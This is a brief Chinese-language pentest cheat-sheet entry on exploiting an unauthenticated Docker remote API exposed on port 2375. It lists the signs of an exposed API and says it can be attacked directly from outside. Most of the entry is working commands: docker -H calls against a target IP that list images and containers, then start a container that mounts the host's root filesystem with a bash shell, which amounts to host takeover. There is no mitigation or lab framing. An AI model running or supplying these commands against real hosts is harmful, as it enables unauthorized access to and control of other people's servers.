# 2375（docker）

识别点：2375端口，/run/docker.sock，可以看到宿主的容器

外网直接打挂上即可

```bash
docker -H tcp://192.168.52.128:2375 images    --查看容器组
docker -H tcp://192.168.52.128:2375 ps      --查看正在运行的容器
docker -H tcp://192.168.52.128:2375 run --rm -it -v /:/tmp/1/ wordpress /bin/bash
挂载宿主目录
```
